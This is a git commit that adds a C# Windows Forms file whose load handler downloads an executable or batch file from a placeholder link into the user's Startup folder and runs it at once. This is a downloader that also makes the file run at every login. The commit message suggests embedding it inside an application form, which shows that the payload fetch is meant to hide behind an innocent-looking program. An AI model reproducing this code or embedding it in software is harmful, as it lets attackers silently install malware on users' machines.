1cc687bf1b0ac18be91dc58d520ed7ecbb62c563
santez <157430892+ssantez@users.noreply.github.com>
2024-01-24 20:48:42 +0300

    Add files via upload
    It will work more harmoniously if you embed it inside an application form

---
+++ Form1.cs
@@ -0,0 +1,42 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Net;
+using System.Text;
+using System.Threading.Tasks;
+
+
+namespace santez
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            ServicePointManager.Expect100Continue = true;
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls
+            | SecurityProtocolType.Tls11
+
+            | SecurityProtocolType.Tls12
+
+            | SecurityProtocolType.Ssl3;
+
+            WebClient client = new WebClient();
+            client.DownloadFile("exe or bat file direct link", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\santez.bat/exe");
+            System.Diagnostics.Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\santez.bat/exe");
+        }
+    }
+}
